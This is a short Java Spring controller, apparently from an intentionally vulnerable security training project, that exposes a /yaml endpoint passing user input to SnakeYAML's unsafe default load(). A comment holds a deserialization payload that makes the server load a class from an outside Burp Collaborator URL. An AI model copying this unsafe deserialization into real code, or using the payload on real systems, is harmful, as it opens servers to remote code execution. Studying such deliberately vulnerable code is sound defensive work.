package org.joychou.controller;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RestController;

import javax.naming.InitialContext;
import javax.naming.NamingException;


@RestController
public class Yaml {

    /*
    org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ['http://kd1t2zb5jo3umbxlxxrfgpswenkj88.burpcollaborator.net/Yaml']]]]')
     */
    @GetMapping("/yaml")
    public String yaml(String content) {
        return new org.yaml.snakeyaml.Yaml().load(content);
    }

    public static void main(String[] args) {
    }
}
